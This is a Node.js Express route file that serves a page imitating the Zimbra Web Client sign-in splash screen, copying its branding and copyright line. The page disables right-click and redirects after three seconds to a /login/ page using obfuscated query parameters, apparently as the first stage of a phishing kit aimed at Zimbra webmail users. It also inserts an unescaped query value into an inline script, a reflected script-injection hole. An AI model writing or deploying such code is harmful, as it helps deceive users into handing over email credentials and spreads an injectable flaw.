
const express = require ('express');
const router = express.Router();

router.use('/static', express.static('public'));
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre;
    const url = `/login/?dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
   <!DOCTYPE html>
    <html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="./files/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="./files/favicon.ico">
	<script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
	 
<style type="text/css" id="operaUserStyle"></style></head>
<body oncontextmenu="return false;">

<div style="display:none;">
      <img src="/files/LoginBanner.png" alt="">
      </div>
    
<div id="skin_container_splash_screen" class="SplashScreen">
	
	
	<div id="ZSplashPanel" class="center">
		<div class="contentBox">
			<h1><div id="ZLoginBannerImage" class="ImgLoginBanner" onclick="showCompanyUrl()"></div></h1>
			<div id="ZLoginAppName">
				Web Client
			</div>
			<div id="#ZSplashBodyContainer" class="content">
				<div class="message">
					Loading ...
				</div>
			</div>
		</div>
        <div class="decor1"></div>
	</div>
	<div class="Footer">
        <div class="copyright">
         Copyright © 2005-2023 Synacor, Inc. All rights reserved.
        </div>
    </div>
	
	</body></html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
